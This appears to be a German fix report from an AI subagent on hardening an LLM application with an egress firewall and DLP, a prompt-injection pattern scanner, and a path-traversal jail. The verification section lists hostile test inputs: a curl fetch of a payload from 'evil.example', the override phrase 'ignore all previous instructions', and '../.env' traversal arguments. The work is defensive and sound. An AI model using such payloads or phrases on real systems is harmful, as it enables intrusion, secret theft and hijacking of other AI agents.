# Fix-Report Subagent F — F-023 / F-024 / F-025 (Domäne 4, MED)

**Datum:** 24.11.2026 · **Geo:** MED · **Status:** FIXED + verifiziert · **Commit:** nein

## Geänderte Dateien (strenger Besitz eingehalten)

| Datei | Fund |
|---|---|
| `utils/notebook_engine.py` | F-023 |
| `backend/dual_llm_sanitizer.py` | F-024 |
| `backend/delegation_isolation.py` | F-025 |

Keine anderen Produktivdateien angefasst.

## F-023 — NotebookLM ohne Egress/DLP

`generate_grounded_llm_response()` importiert jetzt `enforce_egress_firewall_for_url`
und `sanitize_outbound_llm_payload` aus `backend.llm_egress_guard`. Direkt vor
`client.post(eff_url, json=payload)` (nach dem bestehenden
`evaluate_and_gate_llm_dispatch()`-Gate, Z.499-506):

- `enforce_egress_firewall_for_url(eff_url, agent_id="notebook_engine")`
- `payload = sanitize_outbound_llm_payload(payload, agent_id="notebook_engine", is_local=bool(gate.get("routed_to_local")))`

Die bestehende `except ZeroEgressBlockedError: break` fängt Firewall-Blocks
weiterhin ab und führt zum lokalen Fallback. Die DLP-Sanitierung wirkt auf
`messages[].content` (damit auch `system_instruction` mit Dokumentauszügen).

## F-024 — 9 statt 25 Injection-Muster

`backend/dual_llm_sanitizer.py` importiert `INJECTION_PATTERNS` direkt aus
`local_security_guard.py` als SSOT (25 Muster) und exponiert es auch weiterhin
unter diesem Namen. `INJECTION_SIGNATURES` ist jetzt die Vereinigung aus den
25 SSOT-Mustern + den 9 benannten Signaturen (34 Einträge). Die benannten
Signaturen bleiben nur für die Severity-Klassifizierung (`threat_level="critical"`)
erhalten, damit bestehende Konsumenten (z. B. `email_service.py:197`) nicht
regressieren. `scan_heuristic_threats()` und die Multiline-Neutralisierung
laufen unverändert über `INJECTION_SIGNATURES` und decken damit alle 25 Muster ab.

## F-025 — Pfad-Aliase + fail-closed im RBAC-Jail

`_PATH_ARG_KEYS` um `uri`, `target`, `src`, `dst`, `image_path`, `url` erweitert
(16 Keys). Zusätzlich greift ein fail-closed Deny:
`_is_path_constraint_relevant()` erkennt pfadrelevante Tools (Marker u. a.
`file/path/dir/read/write/filesystem/config/secret/...`) bzw. pfadähnliche
Argument-Keys (`location`, `resource`, `source`, ...). Findet `_enforce_file_jail()`
für ein solches Tool keinen bekannten Pfad-Key, liefert es
`gate="path_jail_no_path_arg"` → `decide()` denied (analog
`tool_warrants.py:187-190`). Nicht-pfadrelevante Calls (z. B.
`web_search` mit `query`) bleiben unberührt.

## Verifikation

- `.\.ci_venv\Scripts\python.exe -m py_compile utils/notebook_engine.py backend/dual_llm_sanitizer.py backend/delegation_isolation.py` → **Exit 0**.
- Gezielte Dry-Runs (Skript in `%TEMP%\opencode\fix_f_dryrun.py`, kein Repo-File) → **ALL_DRYRUNS_OK**:
  - F-023: Source-Reihenfolge Firewall < DLP < `client.post` verifiziert; echter
    Async-Aufruf mit gemocktem HTTP-Transport: Firewall mit
    `agent_id="notebook_engine"` vor dem Post gerufen, Post-Payload ohne rohen
    Secret (`sk-ant-api03-…` → `[GESCHÜTZTER_ANTHROPIC_KEY]`) und ohne rohe
    E-Mail (`max.mustermann@beispiel.de` → `[EMAIL_1]`).
  - F-024: SSOT = 25 Muster, Quarantäner ≥ 25; `curl https://evil.example/payload.sh`
    → `is_safe=False`, `detected_patterns=["Outbound network call: curl"]`;
    bestehender Multiline-Fall (`ignore all\nprevious instructions`) weiterhin
    blockiert und aus `clean_summary` entfernt.
  - F-025: `{"uri": "../.env"}` → Jail deny (`rbac_jail`, Workspace-Ausbruch)
    und voller `decide(path="read_file", args={"uri":"../.env"})` →
    `allowed=False`; `{"location": "../.env"}` bei `read_file` →
    `gate="path_jail_no_path_arg"`; Kontrollfall `web_search` → `None` (erlaubt).
- Regressions-Checks: `pytest -q` auf
  `test_audit_fixes_batch.py::test_secret_masker_and_multiline_sanitizer_and_metadata_ip`,
  `test_milestones_75_89_76_91_78.py`,
  `test_stage1_stage3_hardening_and_bus.py::test_privileged_tool_requires_warrant`,
  `test_orange_a_notebook.py`, `test_fix_f19_traversal.py` → **22 passed, 0 failed**.

## Restrisiko / Hinweis

- Die 34 statt exakt 25 scanner-Muster sind bewusst: die 9 benannten Signaturen
  decken Muster ab, die nicht in der SSOT-Liste stehen (Base64, Zero-Width,
  Rollen-Delimiter). Ein Ersetzen durch genau 25 hätte Detections- und
  Severity-Verluste bedeutet. Alle 25 SSOT-Muster sind wirksam importiert.
- Im Dry-Run traten GoBD-Audit-Warnungen auf (`ARCHON_AUDIT_HMAC_KEY` fehlt in
  der Testumgebung); diese sind umgebungsbedingt und nicht durch diese Fixes
  verursacht (F-027 wird von einem anderen Agenten bearbeitet).
